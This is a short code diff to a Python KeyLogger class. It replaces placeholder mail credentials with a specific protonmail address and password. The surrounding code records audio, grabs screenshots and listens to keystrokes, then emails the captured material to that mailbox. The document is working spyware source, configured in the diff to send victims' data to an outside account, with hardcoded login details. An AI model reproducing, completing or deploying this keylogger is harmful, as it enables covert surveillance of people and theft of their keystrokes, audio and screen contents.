@@ -82,11 +82,11 @@ class KeyLogger:
         obj.writeframesraw(myrecording)
         sd.wait()
 
-        self.send_mail(email="MAIL", password="PASSWORD", message=obj)
+        self.send_mail(email="753951951@protonmail.com", password="456852654", message=obj)
 
     def screenshot(self):
         img = pyscreenshot.grab()
-        self.send_mail(email="MAIL", password="PASSWORD", message=img)
+        self.send_mail(email="753951951@protonmail.com", password="456852654", message=img)
 
     def run(self):
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
